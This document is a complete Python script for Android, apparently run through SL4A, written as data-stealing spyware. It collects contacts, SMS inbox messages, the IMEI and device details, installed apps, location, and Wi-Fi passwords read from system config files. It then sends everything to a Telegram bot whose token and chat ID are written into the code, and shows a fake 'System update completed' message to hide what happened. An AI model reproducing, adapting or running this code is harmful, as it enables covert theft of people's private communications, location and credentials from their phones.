import os
import json
import requests
import subprocess
from android import Android
droid = Android()

# Telegram config (replace with your bot token and chat ID)
BOT_TOKEN = '7488268192:AAEY7W284vNk7oqsGoNpSHHab5GEeOKbjBE'
CHAT_ID = '6648554042'
EXFIL_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

# Stealth config
HEADERS = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}

def harvest_contacts():
    contacts = []
    uri = 'content://com.android.contacts/data/phones'
    cursor = droid.queryContent(uri, ['display_name', 'data1']).result
    if cursor:
        while cursor.next():
            contacts.append({
                'name': cursor.getString(0),
                'number': cursor.getString(1)
            })
        cursor.close()
    return contacts

def extract_sms():
    messages = []
    uri = 'content://sms/inbox'
    projection = ['address', 'body', 'date']
    cursor = droid.queryContent(uri, projection).result
    if cursor:
        while cursor.next():
            messages.append({
                'from': cursor.getString(0),
                'text': cursor.getString(1),
                'timestamp': cursor.getString(2)
            })
        cursor.close()
    return messages

def recon_device():
    return {
        'model': subprocess.getoutput('getprop ro.product.model'),
        'sdk': subprocess.getoutput('getprop ro.build.version.sdk'),
        'imei': subprocess.getoutput('service call iphonesubinfo 1 | awk -F "'" '" '{print $2}' |sed -n 1p'),
        'network': droid.getNetworkInfo().result,
        'installed_apps': droid.getInstalledPackages().result
    }

def exfiltrate(data):
    encrypted = data.encode('utf-8').hex()
    payload = {
        'chat_id': CHAT_ID,
        'text': f'<malicious_payload>{encrypted}</malicious_payload>',
        'parse_mode': 'HTML'
    }
    requests.post(EXFIL_URL, headers=HEADERS, data=payload, timeout=20)

def phish_main():
    try:
        loot = {
            'contacts': harvest_contacts(),
            'sms': extract_sms(),
            'device_info': recon_device(),
            'location': droid.getLastKnownLocation().result,
            'wifi_creds': [line.split(':')[-1] for line in subprocess.getoutput('cat /data/misc/wifi/*.conf').split('\n') if 'psk=' in line]
        }
        exfiltrate(json.dumps(loot))
        droid.makeToast('System update completed')
    except Exception as e:
        pass

if __name__ == '__main__':
    phish_main()
    
